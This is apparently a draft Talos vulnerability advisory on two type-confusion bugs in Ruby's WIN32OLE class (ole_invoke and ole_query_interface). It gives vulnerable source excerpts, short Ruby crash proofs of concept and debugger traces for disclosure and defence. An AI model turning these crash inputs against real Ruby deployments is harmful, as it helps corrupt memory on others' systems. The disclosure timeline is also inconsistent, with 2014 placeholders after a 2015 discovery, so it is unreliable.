Cisco Talos Vulnerability Report
TALOS-CAN-XXX

Ruby WIN32OLE class invoke "ole_invoke" and  ole_query_interface "fole_query_interface" methods type confusion vulnerabilities.

:: Description

Type Confusion exists in two methods of Ruby's WIN32OLE class, ole_invoke and ole_query_interface. Attacker passing different type of object than this
assumed by developers can cause arbitrary code execution.
 

:: Tested Versions

Ruby 2.3.0 dev
Ruby 2.2.2

:: Product URLs

https://www.ruby-lang.org

:: Content

:: 1#Details - WIN32OLE invoke "ole_invoke"
:: 2#Details - WIN32OLE ole_query_interface "fole_query_interface"



:: 1#Details - WIN32OLE invoke "ole_invoke"

Vulnerable code:
--------------------------------------------- code -------------------------------------
Line 2545	static VALUE
Line 2546	ole_invoke(int argc, VALUE *argv, VALUE self, USHORT wFlags, BOOL is_bracket)
Line 2547	{
Line 2548		
Line 2549
Line 2550		rb_scan_args(argc, argv, "1*", &cmd, &paramS);
Line 2551		if(!RB_TYPE_P(cmd, T_STRING) && !RB_TYPE_P(cmd, T_SYMBOL) && !is_bracket) {
Line 2552			rb_raise(rb_eTypeError, "method is wrong type (expected String or Symbol)");
Line 2553		}
Line 2554		if (RB_TYPE_P(cmd, T_SYMBOL)) {
Line 2555			cmd = rb_sym2str(cmd);
Line 2556		}
Line 2557		pole = oledata_get_struct(self);
Line 2558		if(!pole->pDispatch) {
Line 2559			rb_raise(rb_eRuntimeError, "failed to get dispatch interface");
Line 2560		}
Line 2561		if (is_bracket) {
Line 2562			DispID = DISPID_VALUE;
Line 2563			argc += 1;
Line 2564			rb_ary_unshift(paramS, cmd);
Line 2565		} else {
Line 2566			wcmdname = ole_vstr2wc(cmd);
Line 2567			hr = pole->pDispatch->lpVtbl->GetIDsOfNames( pole->pDispatch, &IID_NULL,
Line 2568					&wcmdname, 1, lcid, &DispID);
Line 2569			SysFreeString(wcmdname);
Line 2570			if(FAILED(hr)) {
Line 2571				ole_raise(hr, rb_eNoMethodError,
Line 2572						  "unknown property or method: `%s'",
Line 2573						  StringValuePtr(cmd));
Line 2574			}
Line 2575		}
Line 2576
Line 2577		/* pick up last argument of method */
Line 2578		param = rb_ary_entry(paramS, argc-2); <- use paramsS as array without type checking
--------------------------------------------- code -------------------------------------

As You can see in line 2550 ole_invoke function expect at least 1 argument, max 2. First one "cmd" is name of method which should be 
invoked on ole object, second one "paramS" which will focuse on is a list of arguments for this method.
paramS is used in two places, in line 2564 nad line 2578. In our case "is_bracket" param is set to false so "paramS" will only be reached in line 2578.
As we can observe, before line 2578 type of "paramS" is not check anywhere and in this line its treated as Ruby array object. Passing object different
than Array type confusion vulnerability will appear in this line.

:: PoC

---------------------------------- PoC test.rb ----------------------------------------

require 'win32ole'
excel = WIN32OLE.new('Excel.Application')
excel.invoke("Quit",0x11223344)

---------------------------------- PoC test.rb ----------------------------------------

:: Debugger analysis

0:000> g
Breakpoint 5 hit
eax=02aa5878 ebx=00000000 ecx=02a91e90 edx=02aa5878 esi=00000001 edi=00000000
eip=6a5663e0 esp=0057f0c8 ebp=0057f16c iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
> 2606:     param = rb_ary_entry(paramS, argc-2);
win32ole!ole_invoke+0x1e0:
6a5663e0 8b4d08          mov     ecx,dword ptr [ebp+8] ss:002b:0057f174=02000000
0:000> dv paramS
         paramS = 0x2a839bc
0:000> dd poi(paramS)
02a839bc  0000a007 00682f04 22446689 00000000
02a839cc  00000000 00510005 0068a740 74697551
02a839dc  00000000 00000000 00002007 00682f04
02a839ec  00000000 00000000 00000000 0000000c
02a839fc  02a6c4b0 6a5743c8 00000001 02a7aba8
02a83a0c  00506005 0068a740 00000011 02a7a000
02a83a1c  02a6c7a8 00020807 00000000 0000002b
02a83a2c  00000002 02a91110 00502005 0068a740
0:000> p
eax=22446689 ebx=00000000 ecx=00000000 edx=02a839c4 esi=00000001 edi=00000000
eip=6a5663f6 esp=0057f0c8 ebp=0057f16c iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
> 2608:     op.dp.cNamedArgs = 0;
win32ole!ole_invoke+0x1f6:
6a5663f6 c745d800000000  mov     dword ptr [ebp-28h],0 ss:002b:0057f144=00000000
0:000> dv param
          param = 0x22446689
		  
	
	
:: 2#Details - WIN32OLE ole_query_interface "fole_query_interface"


Vulnerable code: 

--------------------------------------------- code -------------------------------------
Line 3524	static VALUE
Line 3525	fole_query_interface(VALUE self, VALUE str_iid)
Line 3526	{
Line 3527	    HRESULT hr;
Line 3528	    OLECHAR *pBuf;
Line 3529	    IID iid;
Line 3530	    struct oledata *pole = NULL;
Line 3531	    IDispatch *pDispatch;
Line 3532	    void *p;
Line 3533	
Line 3534	    pBuf  = ole_vstr2wc(str_iid);


Line 851	LPWSTR
Line 852	ole_vstr2wc(VALUE vstr)
Line 853	{
Line 854		rb_encoding *enc;
Line 855		int cp;
Line 856		UINT size = 0;
Line 857		LPWSTR pw;
Line 858		st_data_t data;
Line 859		struct st_table *tbl = DATA_PTR(enc2cp_hash);
Line 860		enc = rb_enc_get(vstr);
(...)
Line 899    size = MultiByteToWideChar(cp, 0, RSTRING_PTR(vstr), RSTRING_LEN(vstr), NULL, 0);
Line 900    pw = SysAllocStringLen(NULL, size);
Line 901    MultiByteToWideChar(cp, 0, RSTRING_PTR(vstr), RSTRING_LEN(vstr), pw, size);

--------------------------------------------- code -------------------------------------

fole_query_interface takes one argument which is iid of specified interface. Developers assumed that this parameter will be passed to the function
in string form and before usaged of "str_iid" param in line 3543 non of check for type is made.
Attacker passing different type of object than this assumed by developers can cause arbitrary code execution.

:: PoC

---------------------------------- PoC test.rb ----------------------------------------

require 'win32ole'
excel = WIN32OLE.new('Excel.Application')
excel.ole_query_interface(0x11223344)

---------------------------------- PoC test.rb ----------------------------------------

:: Debugger analysis

0:000> r
eax=00000000 ebx=00000000 ecx=00000000 edx=02b0c26a esi=00000001 edi=00000000
eip=6cba388b esp=004fee54 ebp=004fee58 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
>  494:     ENC_MACHING_CP(enc, "Big5", 950);
win32ole!ole_encoding2cp+0xb:
6cba388b 8b4804          mov     ecx,dword ptr [eax+4] ds:002b:00000004=????????

0:000> !analysis -v
No export analysis found
0:000> !analyze -v
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************


FAULTING_IP: 
win32ole!ole_encoding2cp+b [t:\projects\bugs\ruby_debug_x32\ext\win32ole\win32ole.c @ 494]
6cba388b 8b4804          mov     ecx,dword ptr [eax+4]

EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 6cba388b (win32ole!ole_encoding2cp+0x0000000b)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000000
   Parameter[1]: 00000004
Attempt to read from address 00000004

FAULTING_THREAD:  00000f88

DEFAULT_BUCKET_ID:  NULL_CLASS_PTR_READ

PROCESS_NAME:  ruby.exe

ERROR_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - Instrukcja spod 0x%08lx odwo

EXCEPTION_PARAMETER1:  00000000

EXCEPTION_PARAMETER2:  00000004

READ_ADDRESS:  00000004 

FOLLOWUP_IP: 
win32ole!ole_encoding2cp+b [t:\projects\bugs\ruby_debug_x32\ext\win32ole\win32ole.c @ 494]
6cba388b 8b4804          mov     ecx,dword ptr [eax+4]

DETOURED_IMAGE: 1

NTGLOBALFLAG:  470

APPLICATION_VERIFIER_FLAGS:  0

APP:  ruby.exe

PRIMARY_PROBLEM_CLASS:  NULL_CLASS_PTR_READ

BUGCHECK_STR:  APPLICATION_FAULT_NULL_CLASS_PTR_READ

LAST_CONTROL_TRANSFER:  from 6cba1258 to 6cba388b

STACK_TEXT:  
004fee58 6cba1258 00000000 00000001 00240038 win32ole!ole_encoding2cp+0xb
004feec8 6cba7e40 22446689 00000001 00240038 win32ole!ole_vstr2wc+0x58
004feefc 68780549 02d13ac4 22446689 004fefd4 win32ole!fole_query_interface+0x20
004fef0c 68781042 6cba7e20 02d13ac4 00000001 msvcr120_ruby230!call_cfunc_1+0x19
004fefd4 687812bc 00550c08 002bffd0 02d08c48 msvcr120_ruby230!vm_call_cfunc_with_frame+0x2b2
004fefe8 68781592 00550c08 002bffd0 02d08c48 msvcr120_ruby230!vm_call_cfunc+0x4c
004ff08c 6877dc94 00550c08 002bffd0 02d08c48 msvcr120_ruby230!vm_call_method+0xa2
004ff0a0 687853dc 00550c08 002bffd0 02d08c48 msvcr120_ruby230!vm_call_general+0x14
004ff8c0 6878b7a8 00550c08 00000000 02d08550 msvcr120_ruby230!vm_exec_core+0x286c
004ff9b4 6877aeb7 00550c08 68728553 00550d54 msvcr120_ruby230!vm_exec+0x98
004ff9cc 6872857e 02cfc888 d5626410 00000000 msvcr120_ruby230!rb_iseq_eval_main+0x27
004ffa70 68727378 02cfc888 004ffa8c 68726b50 msvcr120_ruby230!ruby_exec_internal+0x10e
004ffa7c 68726b50 02cfc888 d52d9e60 004ffa9c msvcr120_ruby230!ruby_exec_node+0x18
004ffa8c 013b103b 02cfc888 00575540 004ffadc msvcr120_ruby230!ruby_run_node+0x30
004ffa9c 013b1261 00000002 00574dd0 00575540 ruby!main+0x3b
004ffadc 75e2337a 7efde000 004ffb28 77c192e2 ruby!__tmainCRTStartup+0xfd
004ffae8 77c192e2 7efde000 64c5d44c 00000000 kernel32!BaseThreadInitThunk+0xe
004ffb28 77c192b5 013b12c9 7efde000 00000000 ntdll!__RtlUserThreadStart+0x70
004ffb40 00000000 013b12c9 7efde000 00000000 ntdll!_RtlUserThreadStart+0x1b


FAULTING_SOURCE_LINE:  t:\projects\bugs\ruby_debug_x32\ext\win32ole\win32ole.c
FAULTING_SOURCE_FILE:  t:\projects\bugs\ruby_debug_x32\ext\win32ole\win32ole.c
FAULTING_SOURCE_LINE_NUMBER:  494
FAULTING_SOURCE_CODE:  
   490:     /*
   491:      * Is there any better solution to convert
   492:      * Ruby encoding to Windows codepage???
   493:      */
>  494:     ENC_MACHING_CP(enc, "Big5", 950);
   495:     ENC_MACHING_CP(enc, "CP51932", 51932);
   496:     ENC_MACHING_CP(enc, "CP850", 850);
   497:     ENC_MACHING_CP(enc, "CP852", 852);
   498:     ENC_MACHING_CP(enc, "CP855", 855);
   499:     ENC_MACHING_CP(enc, "CP949", 949);


SYMBOL_STACK_INDEX:  0
SYMBOL_NAME:  win32ole!ole_encoding2cp+b
FOLLOWUP_NAME:  MachineOwner
MODULE_NAME: win32ole
IMAGE_NAME:  win32ole.so
DEBUG_FLR_IMAGE_TIMESTAMP:  5554e801
STACK_COMMAND:  ~0s ; kb
FAILURE_BUCKET_ID:  NULL_CLASS_PTR_READ_c0000005_win32ole.so!ole_encoding2cp
BUCKET_ID:  APPLICATION_FAULT_NULL_CLASS_PTR_READ_DETOURED_win32ole!ole_encoding2cp+b
Followup: MachineOwner

:: Credit 

Discovered by Marcin ‘Icewall’ Noga of Sourcefire VRT

:: Timeline

2015-06-18 - Initial Discovery 
2014-XX-XX - Vendor Notification
2014-XX-XX - Patch Released
2014-XX-XX - Public Disclosure